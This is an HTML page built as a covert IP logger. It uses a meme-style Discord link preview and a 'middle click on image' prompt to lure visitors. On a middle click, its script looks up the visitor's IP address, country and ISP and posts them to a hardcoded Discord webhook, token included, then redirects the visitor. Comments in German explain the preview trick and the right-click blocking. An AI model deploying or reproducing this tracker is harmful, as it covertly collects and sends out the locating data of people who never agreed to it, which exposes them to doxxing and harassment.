<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- DAS IST WICHTIG: Discord zeigt dieses Bild als Vorschau an -->
    <meta property="og:title" content="Click the image">
    <meta property="og:description" content="middle click on the image">
    <meta property="og:image" content="https://i.imgur.com/8Km8X8k.png">
    <meta property="og:url" content="https://funnymemeee.vercel.app">
    <meta property="og:type" content="website">
    
    <title>IP Logger</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background-color: #000000;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: system-ui, sans-serif;
        }
        .container {
            text-align: center;
            padding: 2rem;
        }
        .click-image {
            max-width: 500px;
            width: 90%;
            height: auto;
            border-radius: 16px;
            border: 3px solid #00ff00;
            cursor: pointer;
            transition: 0.2s;
        }
        .click-image:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(0,255,0,0.3);
        }
        .info-text {
            margin-top: 2rem;
            color: #00ff00;
            font-family: monospace;
        }
        h1 {
            color: #00ff00;
            margin-bottom: 1.5rem;
            font-size: 1.5rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚠️ MIDDLE CLICK ON IMAGE ⚠️</h1>
        <img class="click-image" src="https://i.imgur.com/8Km8X8k.png" alt="middle click me" id="targetImage">
        <div class="info-text">
            🖱️ MIDDLE CLICK (scroll wheel) 🖱️
        </div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487560533900263614/J95q6sqcDkPqQRrgJU0a2igviRkpm5eAlJCaQuDqy0TqyJ0mT3fQLw2vydLTXRaHziv-';
        let logged = false;

        async function logIP() {
            if (logged) return;
            logged = true;
            
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                const time = new Date().toLocaleString();
                
                const embed = {
                    title: '🖱️ Middle Click Detected',
                    color: 0x00ff00,
                    fields: [
                        { name: '🌐 IP', value: data.ip, inline: true },
                        { name: '📍 Country', value: data.country_name, inline: true },
                        { name: '🏢 ISP', value: data.org, inline: true },
                        { name: '⏰ Time', value: time, inline: false }
                    ]
                };
                
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                });
            } catch(e) {
                console.error(e);
            }
        }

        // NUR MITTELKLICK (button === 1)
        document.getElementById('targetImage').addEventListener('mousedown', (e) => {
            if (e.button === 1) {  // 1 = middle click
                e.preventDefault();
                logIP();
                // Nach dem Loggen zur gleichen Seite weiterleiten (oder woanders hin)
                setTimeout(() => {
                    window.location.href = 'https://funnymemeee.vercel.app';
                }, 100);
            }
        });
        
        // Rechtsklick deaktivieren (optional)
        document.getElementById('targetImage').addEventListener('contextmenu', (e) => {
            e.preventDefault();
        });
    </script>
</body>
</html>
